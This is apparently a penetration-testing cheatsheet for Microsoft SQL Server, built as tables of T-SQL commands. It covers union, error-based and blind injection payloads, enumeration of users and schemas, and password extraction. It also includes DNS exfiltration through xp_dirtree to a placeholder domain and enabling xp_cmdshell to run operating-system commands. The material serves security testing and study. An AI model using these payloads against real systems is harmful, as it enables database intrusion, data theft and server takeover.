---
title:  "MSSQL Cheatsheet"
imgdir: 
tags: web sql
excerpt: Cheatsheet for Microsoft SQL
date: 2021-11-06
---

Note: the segments enclosed in double carets (^^) need to be replaced with the indicated value - examples have been provided where practical.
{: .notice--info}

# MSSQL Injection
## Union based 
([ftb](/articles/owasp10/SQLi/#union-based))

| Function | Command | Ref. |
| --- | --- |---|
| Get Column Count | `ORDER BY ^^column_id^^;`{:.language-sql .highlight}<br>eg.`ORDER BY 1;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/queries/select-order-by-clause-transact-sql) |
| Get Returned Columns | `UNION ALL SELECT 1,2,3;`{:.language-sql .highlight} (incrementing up to column count) | |
|===|===|===|

## Error based
([ftb](/articles/owasp10/SQLi/#error-based))

| Function | Command | Ref. |
| --- | --- |---|
| Trigger error on query | `CONVERT(int,^^query returning string^^);`{:.language-sql .highlight}<br>eg.`CONVERT(int,SELECT @@version);`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql) |
|  | `CAST((^^query returning string^^) as int);`{:.language-sql .highlight}<br>eg.`CAST((SELECT @@version) as int);`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql) |
|===|===|===|

## Blind - Boolean based
([ftb](/articles/owasp10/SQLi/#boolean-based))

| Function | Command | Ref. |
| --- | --- |---|
| Testing True | `OR '1'='1';`{:.language-sql .highlight} |  |
|  | `AND '1'='1';`{:.language-sql .highlight} |  |
| Testing False | `OR '1'='0';`{:.language-sql .highlight} |  |
|  | `AND '1'='0';`{:.language-sql .highlight} |  |
| Binary character discovery | `AND SUBSTRING((SELECT username FROM users WHERE id = 1), 1, 1) > 'm';`{:.language-sql .highlight} |  |
|===|===|===|


## Blind - Time based
([ftb](/articles/owasp10/SQLi/#time-based))

| Function | Command | Ref. |
| --- | --- |---|
| IF query (10sec) | `IF(^^boolean query^^) WAITFOR DELAY '0:0:10';`{:.language-sql .highlight}|  |
|===|===|===|

## Out-of-band - DNS
([ftb](/articles/owasp10/SQLi/#dns-exfiltration))

| Function | Command | Ref. |
| --- | --- |---|
| Test DNS query | `exec master..xp_dirtree '//Subdomain.domain.com/x';`{:.language-sql .highlight} |  |
| DNS Exfiltration | `declare @p varchar(1024);set @p=(SELECT @@version);exec('master..xp_dirtree "//'+@p+'.domain.com/x"');`{:.language-sql .highlight} |
|===|===|===|


# MSSQL Commands

## General

| Function | Command | Ref. |
| --- | --- | --- |
| Block Comment | `/*comment is here (can spread multiple lines)*/`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/slash-star-comment-transact-sql) |
| Comment | `-- comment here, can go at end of line or it's own line`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/comment-transact-sql) |
|===|===|===|

## User Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| Get SQL User | `SELECT CURRENT_USER;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/current-user-transact-sql) |
|  |`SELECT USER_NAME();`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/user-name-transact-sql) |
|  |`SELECT USER;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/user-transact-sql) |
|  |`SELECT SESSION_USER;`{:.language-sql .highlight}| [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/session-user-transact-sql) |
| Get System User | `SELECT SYSTEM_USER;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/system-user-transact-sql) |
|  |`SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysprocesses-transact-sql) |
|  |`SELECT loginame FROM sysprocesses WHERE spid = @@SPID;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysprocesses-transact-sql) |
|  | `SELECT SUSER_NAME();`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-name-transact-sql) |
|  |  `SELECT SUSER_SNAME();`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql) |
| Get Users | `SELECT name FROM master.sys.server_principals;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-principals-transact-sql) |
|  | `SELECT name FROM sys.server_principals;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-principals-transact-sql) |
|  | `SELECT name FROM master..syslogins;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-syslogins-transact-sql) |
|  | `SELECT name FROM syslogins;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-syslogins-transact-sql) |
| Get Users by role | `SELECT name FROM syslogins WHERE ^^role name^^ = ‘1’;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-syslogins-transact-sql) |
|===|===|===|

## Privilege Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
|  Get Server Privs  | `SELECT permission_name FROM master.sys.fn_my_permissions(null, 'SERVER');`{:.language-sql .highlight} |[MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql) |
| Check Permission | `SELECT HAS_PERMS_BY_NAME('^^securable^^', '^^class^^', '^^permission^^');`{:.language-sql .highlight}<br>eg.`SELECT HAS_PERMS_BY_NAME(db_name(), 'DATABASE', 'ANY');`{:.language-sql .highlight} |[MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/has-perms-by-name-transact-sql?view=sql-server-ver15) |
| Get Role | `SELECT IS_SRVROLEMEMBER('^^role name^^');`{:.language-sql .highlight}<br>eg.`SELECT IS_SRVROLEMEMBER('sysadmin');`{:.language-sql .highlight} |[MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql) |
|===|===|===|

## Server Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| Get Version | `SELECT @@version;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/version-transact-sql-configuration-functions) |
|  | `SELECT SERVERPROPERTY('ProductVersion'), SERVERPROPERTY('ProductLevel'), SERVERPROPERTY('Edition');`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/serverproperty-transact-sql) |
|  | `SELECT SERVERPROPERTY('ProductMajorVersion'), SERVERPROPERTY('ProductMinorVersion'), SERVERPROPERTY('ProductBuild');`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/serverproperty-transact-sql) |
| Get Hostname | `SELECT HOST_NAME();`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/host-name-transact-sql) |
|  | `SELECT SERVERPROPERTY('Machine');`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/serverproperty-transact-sql) |
|  | `SELECT SERVERPROPERTY('ServerName');`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/serverproperty-transact-sql) |
|  | `SELECT SERVERPROPERTY('ComputerNamePhysicalNetBIOS');`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/serverproperty-transact-sql) |
|  | `SELECT @@SERVERNAME;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/servername-transact-sql) |
|  | `SELECT srvname FROM master..sysservers;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) |
|  | `SELECT srvname FROM sysservers;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) |
| Get Default Log Path | `SELECT SERVERPROPERTY('InstanceDefaultLogPath');`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/serverproperty-transact-sql) |
| Get Default Data Path | `SELECT SERVERPROPERTY('InstanceDefaultDataPath');`{:.language-sql .highlight} |[MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/serverproperty-transact-sql) |
| Get Default Backup Path | `SELECT SERVERPROPERTY('InstanceDefaultBackupPath');`{:.language-sql .highlight} |[MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/serverproperty-transact-sql) |
|===|===|===|

## Database Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| Get Database Name | `SELECT DB_NAME();`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/db-name-transact-sql) |
|  | `SELECT name FROM master..sysdatabases where dbid=DB_ID();`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysdatabases-transact-sql) |
|  | `SELECT name FROM sysdatabases where dbid=DB_ID();`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysdatabases-transact-sql) |
|  | `SELECT name FROM sys.databases where database_id=DB_ID();`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-databases-transact-sql) |
|  | `SELECT name FROM master.sys.databases where database_id=DB_ID();`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-databases-transact-sql) |
| Get Databases | `SELECT name FROM sysdatabases;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysdatabases-transact-sql) |
|  | `SELECT name FROM sys.databases;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-databases-transact-sql) |
|  | `SELECT DB_NAME(^^database id^^);`{:.language-sql .highlight}<br>eg.`SELECT DB_NAME(1);`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/db-name-transact-sql) |
| Get DB Access | `SELECT HAS_DBACCESS('^^database name^^');`{:.language-sql .highlight}<br>eg.`SELECT HAS_DBACCESS('WebApp');`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/functions/has-dbaccess-transact-sql) |
|===|===|===|

## Schema Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| List Schemas | `SELECT name FROM sys.schemas;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/schemas-catalog-views-sys-schemas)|
| | `SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-information-schema-views/schemata-transact-sql)|
|===|===|===|


## Table Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| Get Tables | `SELECT TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-information-schema-views/tables-transact-sql) |
| Get User Tables | `SELECT NAME FROM SYSOBJECTS WHERE xtype = 'u';`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysobjects-transact-sql) |
|  |  `SELECT name FROM sys.objects WHERE type = 'u';`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-objects-transact-sql) |
| Get Views | `SELECT NAME FROM sysobjects WHERE xtype = 'v';`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysobjects-transact-sql) |
|  | `SELECT NAME FROM sys.objects WHERE type = 'v';`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-objects-transact-sql) |
|===|===|===|

## Column Enumeration

| Function | Command | Ref. |
| --- | --- | --- |
| Get Table Columns | `SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '^^table name^^');`{:.language-sql .highlight}<br>eg.`SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/system-compatibility-views-transact-sql) |
|  | `SELECT name FROM sys.columns WHERE object_id = (SELECT object_id FROM sys.objects WHERE name = '^^table name^^');`{:.language-sql .highlight}<br>eg.`SELECT name FROM sys.columns WHERE object_id = (SELECT object_id FROM sys.objects WHERE name = 'users');`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/object-catalog-views-transact-sql) |
| Get Columns & type | `SELECT syscolumns.name, TYPE_NAME(syscolumns.xtype) FROM syscolumns, sysobjects WHERE syscolumns.id=sysobjects.id AND sysobjects.name='^^tablename^^';`{:.language-sql .highlight}<br>eg.`SELECT syscolumns.name, TYPE_NAME(syscolumns.xtype) FROM syscolumns, sysobjects WHERE syscolumns.id=sysobjects.id AND sysobjects.name='users';`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/object-catalog-views-transact-sql)
|  | `SELECT sys.columns.name, type_name(sys.columns.system_type_id) from sys.columns, sys.objects where sys.columns.object_id=sys.objects.object_id AND sys.objects.name='^^tablename^^';`{:.language-sql .highlight}<br>eg.`SELECT sys.columns.name, type_name(sys.columns.system_type_id) from sys.columns, sys.objects where sys.columns.object_id=sys.objects.object_id AND sys.objects.name='users';`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/object-catalog-views-transact-sql) |
|===|===|===|

## Data Gathering

| Function | Command | Ref. |
| --- | --- | --- |
| Get Values | `SELECT ^^column name^^ FROM ^^table name^^;`{:.language-sql .highlight}<br>eg.`SELECT password FROM users;`{:.language-sql .highlight} | [MS](https://docs.microsoft.com/en-us/sql/t-sql/queries/select-transact-sql) |
| Get conditional | `SELECT ^^column name^^ FROM ^^table name^^ WHERE ^^column name^^ = '^^value^^';`{:.language-sql .highlight}<br>eg.`SELECT password FROM users WHERE username = 'admin';`{:.language-sql .highlight}| [MS](https://docs.microsoft.com/en-us/sql/t-sql/queries/where-transact-sql)
|===|===|===|

## OS Command Execution
([MS](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql))

| Function | Command | Ref. |
| --- | --- | --- |
| Enable Advanced Features | `EXEC sp_configure 'show advanced options',1;`{:.language-sql .highlight}<br>`RECONFIGURE;`{:.language-sql .highlight} |
| Enable Feature | `EXEC sp_configure 'xp_cmdshell',1;`{:.language-sql .highlight}<br>`RECONFIGURE;`{:.language-sql .highlight} |
| Execute Command | `EXEC xp_cmdshell ^^system command^^;`{:.language-sql .highlight} |
|===|===|===|



